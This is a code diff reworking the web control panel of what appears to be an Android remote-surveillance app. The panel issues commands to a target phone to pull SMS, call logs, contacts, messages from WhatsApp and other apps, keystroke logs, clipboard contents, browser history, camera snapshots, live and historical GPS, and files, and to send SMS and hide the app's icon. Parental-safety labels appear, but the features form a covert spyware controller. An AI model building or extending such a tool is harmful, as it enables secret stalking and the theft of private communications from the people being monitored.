+        function getAppNameFromPkg(pkg) { const map = { 'com.whatsapp': 'WhatsApp', 'org.telegram.messenger': 'Telegram', 'com.instagram.android': 'Instagram', 'com.facebook.orca': 'Messenger', 'com.facebook.katana': 'Facebook', 'com.snapchat.android': 'Snapchat' }; return map[pkg] || pkg; }
 
-        // Geofence panel – uses currentLocation
         function showGeofencePanel() {
             if (!currentLocation) {
                 sendCommand('GET_LOCATION');
                 panel.innerHTML = '<h3>🗺️ Geofence</h3><p>Fetching current location...</p>';
-                setTimeout(() => {
-                    if (currentLocation) showGeofencePanelWithLocation();
-                    else panel.innerHTML = '<h3>🗺️ Geofence</h3><p>Unable to get location. Please try GPS Location first.</p><button onclick="sendCommand(\'GET_LOCATION\')">Get Location</button>';
-                }, 2000);
+                setTimeout(() => { if (currentLocation) showGeofencePanelWithLocation(); else panel.innerHTML = '<h3>🗺️ Geofence</h3><p>Unable to get location. Please try GPS Location first.</p><button onclick="sendCommand(\'GET_LOCATION\')">Get Location</button>'; }, 2000);
                 return;
             }
             showGeofencePanelWithLocation();
         }
 
         function showGeofencePanelWithLocation() {
-    const lat = currentLocation.lat, lon = currentLocation.lon;
-    panel.innerHTML = `
-        <h3>🗺️ Geofence — Safety Zone</h3>
-        <p>Current device location: ${lat.toFixed(6)}, ${lon.toFixed(6)}</p>
-        <div id="geofenceMap" style="height:320px;margin-bottom:12px;"></div>
-        <div style="display:flex;gap:8px;flex-wrap:wrap;">
-            <input id="gfLat" placeholder="Latitude" value="${lat.toFixed(6)}">
-            <input id="gfLon" placeholder="Longitude" value="${lon.toFixed(6)}">
-            <input id="gfRadius" placeholder="Radius (m)" value="500">
-        </div>
-        <div class="geofence-controls">
-            <button id="setFenceBtn" style="background:#1976ff;">📍 Set Fence Here</button>
-            <button id="useCurrentBtn" style="background:#4caf50;">📍 Use Current Location</button>
-            <button id="clearFenceBtn" style="background:#ff9800;">🗑️ Clear Fence</button>
-            <button id="getFenceStatusBtn" style="background:#2196f3;">📊 Status</button>
-        </div>
-        <div id="fenceStatus"></div>
-    `;
-    setTimeout(() => {
-        const map = L.map('geofenceMap').setView([lat, lon], 15);
-        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
-        let marker = L.marker([lat, lon]).addTo(map).bindPopup('Current Location');
-        let circle;
-        
-        map.on('click', e => {
-            document.getElementById('gfLat').value = e.latlng.lat.toFixed(6);
-            document.getElementById('gfLon').value = e.latlng.lng.toFixed(6);
-            if (marker) map.removeLayer(marker);
-            marker = L.marker([e.latlng.lat, e.latlng.lng]).addTo(map).bindPopup('Selected Fence Center');
-            if (circle) map.removeLayer(circle);
-            const r = parseFloat(document.getElementById('gfRadius').value) || 500;
-            circle = L.circle([e.latlng.lat, e.latlng.lng], { radius: r, color: '#d32f2f', fillColor: '#d32f2f', fillOpacity: 0.15 }).addTo(map);
-        });
-        
-        document.getElementById('setFenceBtn').onclick = () => {
-            const lat2 = parseFloat(document.getElementById('gfLat').value);
-            const lon2 = parseFloat(document.getElementById('gfLon').value);
-            const rad = parseFloat(document.getElementById('gfRadius').value) || 500;
-            if (isNaN(lat2) || isNaN(lon2)) return showNotification('Enter valid coordinates');
-            sendCommand('SET_GEOFENCE', { lat: lat2, lon: lon2, radius: rad });
-            showNotification('Geofence sent to device');
-        };
-        document.getElementById('useCurrentBtn').onclick = () => {
-            document.getElementById('gfLat').value = lat.toFixed(6);
-            document.getElementById('gfLon').value = lon.toFixed(6);
-            if (marker) map.removeLayer(marker);
-            marker = L.marker([lat, lon]).addTo(map).bindPopup('Current Location');
-            if (circle) map.removeLayer(circle);
-            circle = L.circle([lat, lon], { radius: parseFloat(document.getElementById('gfRadius').value) || 500, color: '#d32f2f', fillColor: '#d32f2f', fillOpacity: 0.15 }).addTo(map);
-        };
-        document.getElementById('clearFenceBtn').onclick = () => sendCommand('CLEAR_GEOFENCE');
-        document.getElementById('getFenceStatusBtn').onclick = () => sendCommand('GET_GEOFENCE');
-    }, 100);
-}
+            const lat = currentLocation.lat, lon = currentLocation.lon;
+            panel.innerHTML = `<h3>🗺️ Geofence — Safety Zone</h3><p>Current device location: ${lat.toFixed(6)}, ${lon.toFixed(6)}</p><div id="geofenceMap" style="height:320px;margin-bottom:12px;"></div><div style="display:flex;gap:8px;flex-wrap:wrap;"><input id="gfLat" placeholder="Latitude" value="${lat.toFixed(6)}"><input id="gfLon" placeholder="Longitude" value="${lon.toFixed(6)}"><input id="gfRadius" placeholder="Radius (m)" value="500"></div><div class="geofence-controls"><button id="setFenceBtn" style="background:#1976ff;">📍 Set Fence Here</button><button id="useCurrentBtn" style="background:#4caf50;">📍 Use Current Location</button><button id="clearFenceBtn" style="background:#ff9800;">🗑️ Clear Fence</button><button id="getFenceStatusBtn" style="background:#2196f3;">📊 Status</button></div><div id="fenceStatus"></div>`;
+            setTimeout(() => {
+                const map = L.map('geofenceMap').setView([lat, lon], 15);
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+                let marker = L.marker([lat, lon]).addTo(map).bindPopup('Current Location');
+                let circle;
+                map.on('click', e => {
+                    document.getElementById('gfLat').value = e.latlng.lat.toFixed(6);
+                    document.getElementById('gfLon').value = e.latlng.lng.toFixed(6);
+                    if (marker) map.removeLayer(marker);
+                    marker = L.marker([e.latlng.lat, e.latlng.lng]).addTo(map).bindPopup('Selected Fence Center');
+                    if (circle) map.removeLayer(circle);
+                    const r = parseFloat(document.getElementById('gfRadius').value) || 500;
+                    circle = L.circle([e.latlng.lat, e.latlng.lng], { radius: r, color: '#d32f2f', fillColor: '#d32f2f', fillOpacity: 0.15 }).addTo(map);
+                });
+                document.getElementById('setFenceBtn').onclick = () => { const lat2 = parseFloat(document.getElementById('gfLat').value); const lon2 = parseFloat(document.getElementById('gfLon').value); const rad = parseFloat(document.getElementById('gfRadius').value) || 500; if (isNaN(lat2) || isNaN(lon2)) return showNotification('Enter valid coordinates'); sendCommand('SET_GEOFENCE', { lat: lat2, lon: lon2, radius: rad }); showNotification('Geofence sent to device'); };
+                document.getElementById('useCurrentBtn').onclick = () => { document.getElementById('gfLat').value = lat.toFixed(6); document.getElementById('gfLon').value = lon.toFixed(6); if (marker) map.removeLayer(marker); marker = L.marker([lat, lon]).addTo(map).bindPopup('Current Location'); if (circle) map.removeLayer(circle); circle = L.circle([lat, lon], { radius: parseFloat(document.getElementById('gfRadius').value) || 500, color: '#d32f2f', fillColor: '#d32f2f', fillOpacity: 0.15 }).addTo(map); };
+                document.getElementById('clearFenceBtn').onclick = () => sendCommand('CLEAR_GEOFENCE');
+                document.getElementById('getFenceStatusBtn').onclick = () => sendCommand('GET_GEOFENCE');
+            }, 100);
+        }
 
         function displayGeofenceInfo(data) {
-    const statusDiv = document.getElementById('fenceStatus');
-    if (statusDiv && data && data.active) {
-        statusDiv.innerHTML = `<div style="margin-top:12px;padding:12px;background:#e8f5e9;border-radius:8px;"><strong>✅ Active Geofence</strong><br>📍 ${data.lat.toFixed(5)}, ${data.lon.toFixed(5)}<br>📏 Radius: ${data.radius}m</div>`;
-    } else if (statusDiv) {
-        statusDiv.innerHTML = `<div style="margin-top:12px;padding:12px;background:#fff3e0;border-radius:8px;">⚠️ No active geofence</div>`;
-    }
-    }
-
-        // Toggle Live GPS tracking
-            function toggleLiveGps() {
-                liveGpsActive = !liveGpsActive;
-                sendCommand(liveGpsActive ? 'START_GPS_UPDATES' : 'STOP_GPS_UPDATES');
-                const btn = document.getElementById('liveGpsBtn');
-                if (btn) {
-                    btn.style.background = liveGpsActive ? '#d32f2f' : '';
-                    btn.querySelector('span:last-child').textContent = liveGpsActive ? 'Stop GPS Track' : 'Live GPS Track';
-                }
-                if (liveGpsActive && currentLocation) {
-                    renderLiveMap(currentLocation.lat, currentLocation.lon, currentLocation.acc);
-                } else if (!liveGpsActive) {
-                    panel.innerHTML = '<p>Live GPS tracking stopped.</p>';
-                    liveMap = null; liveMarker = null; liveCircle = null;
-                }
+            const statusDiv = document.getElementById('fenceStatus');
+            if (statusDiv && data && data.active) {
+                statusDiv.innerHTML = `<div style="margin-top:12px;padding:12px;background:#e8f5e9;border-radius:8px;"><strong>✅ Active Geofence</strong><br>📍 ${data.lat.toFixed(5)}, ${data.lon.toFixed(5)}<br>📏 Radius: ${data.radius}m</div>`;
+            } else if (statusDiv) {
+                statusDiv.innerHTML = `<div style="margin-top:12px;padding:12px;background:#fff3e0;border-radius:8px;">⚠️ No active geofence</div>`;
             }
-
-        function showLocationHistoryPanel() {
-            panel.innerHTML = `<h3>📍 Location History</h3><p>GPS fixes are logged automatically here. Select a timeframe to fetch data.</p><div style="display:flex; gap: 8px; margin-bottom: 24px;"><button class="btn-ui primary" data-days="1">Today</button><button class="btn-ui primary" data-days="3">Last 3 Days</button><button class="btn-ui primary" data-days="5">Last 5 Days</button></div><div id="historyMap" style="height:400px; border-radius:12px; border:1px solid var(--border); display:none; margin-bottom: 24px;"></div><div id="historyMainList"></div>`;
-            panel.querySelectorAll('button[data-days]').forEach(btn => { btn.onclick = () => { panel.querySelector('#historyMainList').innerHTML = '<p>Loading data...</p>'; document.getElementById('historyMap').style.display = 'none'; sendCommand('GET_LOCATION_HISTORY', { days: parseInt(btn.dataset.days) }); }; });
-            setTimeout(() => { window._historyMap = L.map('historyMap').setView([20.0, 0.0], 2); L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(window._historyMap); }, 100);
-            sendCommand('GET_LOCATION_HISTORY', { days: 3 });
         }
 
-        function displayLocationHistory(data) {
-            const listDiv = document.getElementById('historyMainList');
-            if (!listDiv) return;
-            listDiv.innerHTML = '';
-            if (!Array.isArray(data) || data.length === 0) { listDiv.innerHTML = '<p style="color:#999">No history yet.</p>'; return; }
-            if (window._historyMap) {
-                try {
-                    const coords = data.map(p => [p.lat, p.lon]);
-                    if (coords.length > 1) L.polyline(coords, { color: '#1976ff', weight: 3 }).addTo(window._historyMap);
-                    data.forEach((p, i) => { L.circleMarker([p.lat, p.lon], { radius: i === 0 ? 8 : 5, color: i === 0 ? '#d32f2f' : '#1976ff', fillOpacity: 0.8 }).addTo(window._historyMap).bindPopup(`<b>${p.timeFmt || p.date || ''}</b><br>${p.address || (p.lat.toFixed(4)+','+p.lon.toFixed(4))}`); });
-                    if (coords.length > 0) window._historyMap.setView(coords[0], 13);
-                } catch (e) { console.warn('Map plot:', e); }
-            }
-            let html = '<table><thead><tr><th>Time</th><th>Location</th><th>Map</th></tr></thead><tbody>';
-            data.forEach(p => { html += `<tr><td>${escapeHtml(p.timeFmt || p.date || '')}</td><td>${escapeHtml(p.address || (p.lat.toFixed(4)+', '+p.lon.toFixed(4)))}</td><td><a href="https://maps.google.com/?q=${p.lat},${p.lon}" target="_blank">📍</a></td></tr>`; });
-            html += '</tbody></table>';
-            listDiv.innerHTML = html;
-        }
-
-        // Additional panels (Auto Capture, Send SMS, App Events, SMS Keywords)
         function showSchedulePanel() {
             panel.innerHTML = '<h3>⏱️ Auto Screenshot</h3><div><label>Interval (minutes): <input id="schedInterval" type="number" value="5" min="1"></label><label style="margin-left:12px;">Camera: <select id="schedCam"><option value="0">Rear</option><option value="1">Front</option></select></label><button id="startSched" style="background:#1976ff;color:white;border:none;padding:8px 16px;border-radius:6px;margin-top:12px;">Start</button><button id="stopSched" style="background:#d32f2f;color:white;border:none;padding:8px 16px;border-radius:6px;margin-top:12px;margin-left:8px;">Stop</button></div>';
             document.getElementById('startSched').onclick = () => { const mins = parseInt(document.getElementById('schedInterval').value) || 5; const cam = parseInt(document.getElementById('schedCam').value); sendCommand('SET_SCHEDULED_CAPTURE', { intervalMinutes: mins, cameraId: cam }); };
@@ -2440,13 +2544,77 @@ function renderMap(data) {
             document.getElementById('sendSmsBtn').onclick = () => { const num = document.getElementById('smsNumber').value.trim(); const body = document.getElementById('smsBody').value.trim(); if (!num || !body) return showNotification('Enter number and message'); sendCommand('SEND_SMS', { number: num, body }); };
         }
 
+        function showLocationHistoryPanel() {
+            panel.innerHTML = `<h3>📍 Location History</h3><p>GPS fixes are logged automatically every 30 mins. Select a timeframe to fetch data.</p><div style="display:flex; gap: 8px; margin-bottom: 24px;"><button class="btn-ui primary" data-days="1">Today</button><button class="btn-ui primary" data-days="3">Last 3 Days</button><button class="btn-ui primary" data-days="5">Last 5 Days</button></div><div id="historyMap" style="height:400px; border-radius:12px; border:1px solid var(--border); margin-bottom: 24px;"></div><div id="historyMainList"></div>`;
+            panel.querySelectorAll('button[data-days]').forEach(btn => { 
+                btn.onclick = () => { 
+                    panel.querySelector('#historyMainList').innerHTML = '<p>Loading data...</p>'; 
+                    sendCommand('GET_LOCATION_HISTORY', { days: parseInt(btn.dataset.days) }); 
+                }; 
+            });
+            setTimeout(() => { 
+                if (!window._historyMap) {
+                    window._historyMap = L.map('historyMap').setView([20.0, 0.0], 2); 
+                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(window._historyMap); 
+                    window._historyLayers = L.layerGroup().addTo(window._historyMap);
+                }
+            }, 100);
+            sendCommand('GET_LOCATION_HISTORY', { days: 3 });
+        }
+
+        function displayLocationHistory(data) { 
+            const history = typeof data === 'string' ? JSON.parse(data) : data;
+            if (!Array.isArray(history) || history.length === 0) {
+                const listDiv = panel.querySelector('#historyMainList');
+                if (listDiv) listDiv.innerHTML = '<p>No history found for this period.</p>';
+                return;
+            }
+            
+            // Ensure map and layers are initialized
+            if (!window._historyMap) {
+                 window._historyMap = L.map('historyMap').setView([20.0, 0.0], 2); 
+                 L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(window._historyMap); 
+            }
+            if (!window._historyLayers) {
+                 window._historyLayers = L.layerGroup().addTo(window._historyMap);
+            }
+            
+            // Clear map layers
+            window._historyLayers.clearLayers();
+            
+            const points = [];
+            let html = `<div class="table-container"><table><thead><tr><th>Time</th><th>Location</th><th>Address</th></tr></thead><tbody>`;
+            
+            history.forEach((loc, index) => {
+                const lat = loc.lat || loc.latitude;
+                const lon = loc.lon || loc.longitude;
+                if (lat && lon) {
+                    points.push([lat, lon]);
+                    const marker = L.circleMarker([lat, lon], { radius: 6, color: '#1976ff', fillColor: '#1976ff', fillOpacity: 0.8 })
+                        .bindPopup(`<b>Time:</b> ${loc.timeFmt || ''}<br><b>Acc:</b> ${loc.accuracy || 0}m<br>${loc.address || ''}`);
+                    if (window._historyLayers) marker.addTo(window._historyLayers);
+                }
+                html += `<tr><td>${loc.timeFmt || ''}</td><td style="font-size:11px;">${lat !== undefined ? lat.toFixed(5) : ''}, ${lon !== undefined ? lon.toFixed(5) : ''}</td><td>${escapeHtml(loc.address || '')}</td></tr>`;
+            });
+            
+            html += `</tbody></table></div>`;
+            const listDiv = panel.querySelector('#historyMainList');
+            if (listDiv) listDiv.innerHTML = html;
+            
+            if (points.length > 0 && window._historyMap) {
+                const polyline = L.polyline(points, { color: '#1976ff', weight: 4, opacity: 0.5 });
+                if (window._historyLayers) polyline.addTo(window._historyLayers);
+                window._historyMap.fitBounds(polyline.getBounds(), { padding: [30, 30] });
+            }
+        }
+
         function showAppEventsPanel() {
             panel.innerHTML = '<h3>📦 App & Call Events</h3><p>App installs/removals and call events from device.</p><div><button data-days="1" style="background:#1976ff;color:white;border:none;padding:6px 12px;border-radius:6px;margin:4px;">Today</button><button data-days="3" style="background:#1976ff;color:white;border:none;padding:6px 12px;border-radius:6px;margin:4px;">3 Days</button><button data-days="5" style="background:#1976ff;color:white;border:none;padding:6px 12px;border-radius:6px;margin:4px;">5 Days</button></div><div id="appEventsList"></div>';
             panel.querySelectorAll('button[data-days]').forEach(btn => btn.onclick = () => sendCommand('GET_APP_EVENTS', { days: parseInt(btn.dataset.days) }));
             sendCommand('GET_APP_EVENTS', { days: 5 });
         }
 
-        function displayAppEvents(data) { panel.innerHTML = '<p>Events loaded (simplified)</p>'; }
+        function displayAppEvents(data) { panel.innerHTML = '<p>Events loaded</p>'; }
 
         function showSmsKeywordsPanel() {
             panel.innerHTML = '<h3>🔑 SMS Keyword Alerts</h3><p>Get alerts when incoming SMS contains any of these words.</p><div><input id="kwInput" placeholder="drug, fight, bully" style="width:100%;padding:8px;margin:8px 0;border:1px solid #ddd;border-radius:6px;"><button id="saveKw" style="background:#1976ff;color:white;border:none;padding:8px;border-radius:6px;width:100%;">Save Keywords</button></div><div style="margin-top:12px;"><button id="viewKw" style="background:#4caf50;color:white;border:none;padding:6px 12px;border-radius:6px;">View Current</button><button id="clearKw" style="background:#ff9800;color:white;border:none;padding:6px 12px;border-radius:6px;margin-left:8px;">Clear All</button><button id="viewAlerts" style="background:#2196f3;color:white;border:none;padding:6px 12px;border-radius:6px;margin-left:8px;">View Alerts</button></div><div id="kwResult" style="margin-top:12px;"></div>';
@@ -2456,11 +2624,29 @@ function renderMap(data) {
             document.getElementById('viewAlerts').onclick = () => sendCommand('GET_SMS_ALERTS', { days: 5 });
         }
 
-        function displaySmsKeywords(data) { /* simplified */ }
-        function displaySmsAlerts(data) { /* simplified */ }
+        function displaySmsKeywords(data) { }
+        function displaySmsAlerts(data) { }
 
         function capturePicture() { const camera = document.querySelector('input[name="clickCameraSelect"]:checked').value; sendCommand('CAMERA_SNAPSHOT', { camera, flash: document.getElementById('clickFlashCheckbox').checked }); }
         function displayCapturedImage(b64) { panel.innerHTML = `<img src="data:image/jpeg;base64,${b64}" style="max-width:100%;border-radius:8px;"><div style="margin-top:12px;"><button onclick="downloadBase64('${b64}','snapshot_${Date.now()}.jpeg')" style="background:#1976ff;color:white;border:none;padding:8px 16px;border-radius:6px;">💾 SAVE IMAGE</button></div>`; }
+
+        function toggleLiveGps() {
+            liveGpsActive = !liveGpsActive;
+            sendCommand(liveGpsActive ? 'START_GPS_UPDATES' : 'STOP_GPS_UPDATES');
+            const btn = document.getElementById('liveGpsBtn');
+            if (btn) {
+                btn.style.background = liveGpsActive ? '#d32f2f' : '';
+                btn.querySelector('span:last-child').textContent = liveGpsActive ? 'Stop GPS Track' : 'Live GPS Track';
+            }
+            if (liveGpsActive && currentLocation) {
+                renderLiveMap(currentLocation.lat, currentLocation.lon, currentLocation.acc);
+            } else if (!liveGpsActive) {
+                panel.innerHTML = '<p>Live GPS tracking stopped.</p>';
+                liveMap = null;
+                liveMarker = null;
+                liveCircle = null;
+            }
+        }
 
         function toggleAppIcon() { sendCommand(iconHidden ? 'SHOW_APP' : 'HIDE_APP'); }
         function toggleFlash() { sendCommand(flashOn ? 'FLASH_OFF' : 'FLASH_ON'); }
@@ -2468,7 +2654,7 @@ function renderMap(data) {
         // ==================== MESSAGE HANDLER ====================
         function handleJSON(json) {
             if (Array.isArray(json)) {
-                if (pendingCommand === 'LIST_FILES') { currentData = json; fileTreeCache[currentPath] = json; expandedFolders.add(currentPath); renderFiles(); }
+                if (pendingCommand === 'LIST_FILES') { currentData = json; renderFiles(); }
                 else if (pendingCommand === 'GET_SMS') { displaySMS(json); }
                 else if (pendingCommand === 'GET_CALL_LOGS') { displayCallLogs(json); }
                 else if (pendingCommand === 'GET_CONTACTS') { displayContacts(json); }
@@ -2477,32 +2663,44 @@ function renderMap(data) {
             }
             switch (json.type) {
                 case 'FILE_LIST':
-                    try { const _fl = typeof json.data === 'string' ? JSON.parse(json.data) : json.data; const _files = Array.isArray(_fl) ? _fl : []; fileTreeCache[currentPath] = _files; expandedFolders.add(currentPath); renderFiles(); } catch (e) {}
+                    try {
+                        const _fl = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                        const _files = Array.isArray(_fl) ? _fl : [];
+                        if (window.pendingFolderLoad) {
+                            const { path: fPath, inner: fInner } = window.pendingFolderLoad;
+                            fileTreeCache[fPath] = _files;
+                            fInner.innerHTML = renderFileTreeNodes(_files, fPath);
+                            attachFileEventListeners(fInner);
+                            window.pendingFolderLoad = null;
+                        } else {
+                            fileTreeCache[currentPath || 'root'] = _files;
+                            currentData = _files;
+                            renderFiles();
+                            attachFileEventListeners(document.getElementById('tree-root-container'));
+                        }
+                    } catch (e) { console.error('FILE_LIST error:', e); }
                     break;
-                case 'SMS_DATA': try { displaySMS(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) {} break;
-                case 'CALL_LOGS': try { displayCallLogs(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) {} break;
-                case 'CONTACTS_DATA': try { displayContacts(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) {} break;
-                case 'WIFI_NETWORKS_DATA': try { displayWifiNetworks(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) {} break;
-                case 'SOCIAL_MESSAGES_DATA': try { displaySocialMessages(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) {} break;
+                case 'SMS_DATA': try { displaySMS(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
+                case 'CALL_LOGS': try { displayCallLogs(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
+                case 'CONTACTS_DATA': try { displayContacts(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
+                case 'WIFI_NETWORKS_DATA': try { displayWifiNetworks(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
+                case 'SOCIAL_MESSAGES_DATA': try { displaySocialMessages(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                 case 'CAMERA_IMAGE': displayCapturedImage(json.data); break;
                 case 'LOCATION_UPDATE':
-                    const loc = json.data || json;
-                    const lat = loc.lat || loc.latitude;
-                    const lon = loc.lon || loc.longitude;
-                    const acc = loc.accuracy || 10;
-                    currentLocation = { lat, lon, acc };
-                    if (liveGpsActive) {
-                        if (liveMap) renderLiveMap(lat, lon, acc);
-                        else renderLiveMap(lat, lon, acc);
-                    } else {
-                        renderMap(loc);
-                    }
+                    try {
+                        const loc = typeof json.data === 'string' ? JSON.parse(json.data) : (json.data || json);
+                        if (liveGpsActive) {
+                            const lat = loc.lat || loc.latitude;
+                            const lon = loc.lon || loc.longitude;
+                            const acc = loc.accuracy || 10;
+                            currentLocation = { lat, lon, acc };
+                            renderLiveMap(lat, lon, acc);
+                        } else {
+                            renderMap(loc);
+                        }
+                    } catch (e) { console.error('Error parsing location update:', e); }
                     break;
-
-                case 'GEOFENCE_INFO':
-                    try { displayGeofenceInfo(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) {}
-                break;
-                case 'LOCATION_HISTORY_DATA': try { displayLocationHistory(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) {} break;
+                case 'GEOFENCE_INFO': try { displayGeofenceInfo(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                 case 'FILE_INFO': fileTransfers[json.transferId] = { chunks: new Array(json.totalChunks), totalChunks: json.totalChunks, fileName: json.fileName, received: 0 }; document.getElementById('progressFileName').innerText = json.fileName; document.getElementById('progressPercent').innerText = '0%'; document.getElementById('progressBar').style.width = '0%'; document.getElementById('downloadProgress').style.display = 'block'; break;
                 case 'FILE_CHUNK':
                     const tr = fileTransfers[json.transferId];
@@ -2518,25 +2716,35 @@ function renderMap(data) {
                             document.getElementById('progressBar').style.width = pct + '%';
                             if (tr.received === tr.totalChunks) {
                                 const blob = new Blob(tr.chunks), url = URL.createObjectURL(blob), a = document.createElement('a');
-                                a.href = url; a.download = tr.fileName; a.click(); URL.revokeObjectURL(url);
+                                a.href = url;
+                                a.download = tr.fileName;
+                                a.click();
+                                URL.revokeObjectURL(url);
                                 delete fileTransfers[json.transferId];
                                 document.getElementById('downloadProgress').style.display = 'none';
                                 showNotification(`✅ Downloaded: ${tr.fileName}`);
                             }
-                        } catch (e) { showNotification('Chunk decode error'); delete fileTransfers[json.transferId]; document.getElementById('downloadProgress').style.display = 'none'; }
+                        } catch (e) {
+                            showNotification('Chunk decode error');
+                            delete fileTransfers[json.transferId];
+                            document.getElementById('downloadProgress').style.display = 'none';
+                        }
                     }, 0);
                     break;
                 case 'FLASH_ON': flashOn = true; document.getElementById('flashBtn').innerText = 'Flash Off'; showNotification('🔦 Flashlight ON'); break;
                 case 'FLASH_OFF': flashOn = false; document.getElementById('flashBtn').innerText = 'Flash On'; showNotification('🔦 Flashlight OFF'); break;
                 case 'APP_HIDDEN': iconHidden = true; document.getElementById('iconBtn').innerText = 'Show Icon'; showNotification('App icon hidden'); break;
                 case 'APP_SHOWN': iconHidden = false; document.getElementById('iconBtn').innerText = 'Hide Icon'; showNotification('App icon shown'); break;
-                case 'INSTALLED_APPS': try { displayInstalledApps(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) {} break;
-                case 'BROWSER_HISTORY_DATA': try { displayBrowserHistory(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) {} break;
-                case 'KEYLOG_DATA': try { displayKeylog(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) {} break;
-                case 'CLIPBOARD_DATA': try { displayClipboard(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) {} break;
-                case 'APP_EVENTS_DATA': try { displayAppEvents(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) {} break;
-                case 'SMS_KEYWORDS_DATA': try { displaySmsKeywords(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) {} break;
-                case 'SMS_ALERTS_DATA': try { displaySmsAlerts(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) {} break;
+                case 'INSTALLED_APPS': try { displayInstalledApps(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
+                case 'APP_USAGE_DATA': try { displayAppUsage(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
+                case 'BROWSER_HISTORY_DATA': try { displayBrowserHistory(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
+                case 'KEYLOG_DATA': try { displayKeylog(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
+                case 'CLIPBOARD_DATA': try { displayClipboard(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
+                case 'RECENT_IMAGES_DATA': try { displayPhotoGallery(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
+                case 'LOCATION_HISTORY_DATA': try { displayLocationHistory(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
+                case 'APP_EVENTS_DATA': try { displayAppEvents(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
+                case 'SMS_KEYWORDS_DATA': try { displaySmsKeywords(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
+                case 'SMS_ALERTS_DATA': try { displaySmsAlerts(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                 case 'GEOFENCE_SET': showNotification('✅ Geofence activated'); break;
                 case 'GEOFENCE_CLEARED': showNotification('Geofence cleared'); break;
                 case 'GEOFENCE_ALERT': pushAlert('Geofence', json.event === 'EXIT' ? '🚨 DEVICE LEFT safe zone!' : '✅ Device returned to safe zone'); break;
@@ -2546,16 +2754,7 @@ function renderMap(data) {
                 case 'SMS_SENT': showNotification('✅ SMS sent successfully'); break;
                 case 'FILE_DELETED': showNotification('File deleted'); sendCommand('LIST_FILES', { path: currentPath }); break;
                 case 'VIBRATE_COMPLETE': showNotification('📳 Vibrated'); break;
-                case 'GPS_UPDATES_STOPPED': 
-                    liveGpsActive = false;
-                    const gpsBtn = document.getElementById('liveGpsBtn');
-                    if (gpsBtn) {
-                        gpsBtn.querySelector('span:last-child').textContent = 'Live GPS Track';
-                        gpsBtn.style.background = '';
-                    }
-                    showNotification('GPS tracking stopped');
-                break;
-
+                case 'GPS_UPDATES_STOPPED': liveGpsActive = false; const gpsBtn = document.getElementById('liveGpsBtn'); if (gpsBtn) { gpsBtn.querySelector('span:last-child').textContent = 'Live GPS Track'; gpsBtn.style.cssText = ''; } showNotification('GPS tracking stopped'); break;
                 case 'NOTIFICATION_LIVE': pushAlert('📳 ' + (json.app || 'App'), (json.title || '') + ': ' + (json.text || '')); break;
                 case 'CALL_ALERT': if (json.event === 'RINGING') pushAlert('📞 Incoming Call', (json.name || 'Unknown') + ' (' + (json.number || '') + ')'); else if (json.event === 'MISSED') pushAlert('📵 Missed Call', (json.name || 'Unknown') + ' (' + (json.number || '') + ')'); break;
                 case 'SMS_KEYWORD_ALERT': pushAlert('🔑 Keyword: ' + json.keyword, 'From ' + json.from + ': ' + json.body); break;
@@ -2568,12 +2767,12 @@ function renderMap(data) {
             if (msg.startsWith("CAMERA_IMAGE:")) displayCapturedImage(msg.substring(13));
             else if (msg.startsWith("FLASH_ON")) { flashOn = true; document.getElementById('flashBtn').innerText = 'Flash Off'; showNotification('Flash ON'); }
             else if (msg.startsWith("FLASH_OFF")) { flashOn = false; document.getElementById('flashBtn').innerText = 'Flash On'; showNotification('Flash OFF'); }
-            else if (msg.startsWith("LOC_DATA:")) try { renderMap(JSON.parse(msg.substring(9))); } catch (e) {}
-            else if (msg.startsWith("SMS_DATA:")) try { displaySMS(JSON.parse(msg.substring(9))); } catch (e) {}
-            else if (msg.startsWith("CALL_DATA:")) try { displayCallLogs(JSON.parse(msg.substring(10))); } catch (e) {}
-            else if (msg.startsWith("CONTACTS_DATA:")) try { displayContacts(JSON.parse(msg.substring(14))); } catch (e) {}
-            else if (msg.startsWith("WIFI_DATA:")) try { displayWifiNetworks(JSON.parse(msg.substring(10))); } catch (e) {}
